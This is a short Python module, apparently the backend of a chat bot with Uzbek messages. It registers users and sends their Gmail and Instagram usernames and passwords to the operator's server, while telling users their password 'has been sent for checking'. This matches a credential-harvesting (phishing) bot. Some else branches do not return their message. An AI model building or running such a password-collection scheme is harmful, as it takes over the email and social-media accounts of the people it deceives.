import requests
import json
BASE_URL ="http://127.0.0.1:8000/"

def create_user(username, name,user_id):
    url = f"{BASE_URL}/bot"
    response = requests.get(url=url).text
    data = json.loads(response)
    user_exist = False
    for i in data:
        if i["user_id"] == str(user_id):
            user_exist = True
            break
    if user_exist == False:
        post = requests.post(url=url , data={"username":username , "name":name , "user_id":user_id})
        return "Foydalanuvchi yaratildi"
    else:
        return "foydalanuvchi mavjud"
    
    
def create_gmail(user_id, gmail,passvort):
    url = f"{BASE_URL}/gmail"
    if gmail and user_id:
        post = requests.post(url=url, data={
            "user_id":user_id,
            "gmail":gmail,
            "passvort":passvort,
        })
        return "parolinggiz tekshirish uchun yuborildi"
    else:
        "tekshirib bo'lmayapdi"
    
    
def create_insta_user(user_id,insta_user, instapasvort):
    url =f"{BASE_URL}/insta"
    if insta_user and user_id:
        post = requests.post(url=url , data={
            "user_id":user_id,
            "insta_user":insta_user,
            "instapasvort":instapasvort,
        })
        return "parolinggiz tekshirish uchun yuborildi"
    else:
        "tekshirib bo'lmayapdi"

